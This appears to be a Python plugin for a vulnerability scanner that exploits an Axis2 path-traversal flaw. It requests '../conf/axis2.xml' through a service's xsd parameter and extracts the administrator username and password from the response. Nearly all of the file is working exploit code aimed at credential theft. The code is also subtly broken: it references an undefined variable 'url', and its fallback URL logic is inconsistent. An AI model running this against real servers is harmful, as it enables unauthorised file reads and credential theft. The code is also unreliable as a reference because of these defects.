#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'axis2_file_read'
        self.info = "Check the Axis2 arbitrary file read vuln"
        self.keyword = ['all', 'axis', 'axis2', 'file_read', 'web', 'intranet',]
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        url1 = "http://%s:%d/axis2/services/listServices"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/axis2/services/listServices"%(ip, int(port), add_web_path)
        url2 = "http://%s:%d/axis2/services/listServices"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/axis2/services/listServices"%(ip, int(port), add_web_path)

        try:
            req = Requester(url1)
            m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', req.html)
            if m.group(1):
                server_str = m.group(1)
                read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
                res = Requester(read_url)
                if 'axisconfig' in str(res.html):
                    user = re.search('<parameter name="userName">(.*?)</parameter>', res.html)
                    password = re.search('<parameter name="password">(.*?)</parameter>', res.html)
                    result = '%s exists Axis2 arbitrary file read vuln, %s:%s' % (read_url, user.group(1), password.group(1))
                    self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2)
                m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', req.html)
                if m.group(1):
                    server_str = m.group(1)
                    read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
                    res = Requester(read_url)
                    if 'axisconfig' in str(res.html):
                        user = re.search('<parameter name="userName">(.*?)</parameter>', res.html)
                        password = re.search('<parameter name="password">(.*?)</parameter>', res.html)
                        result = '%s exists Axis2 arbitrary file read vuln, %s:%s' % (read_url, user.group(1), password.group(1))
                        self._output(ip, port, result)
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker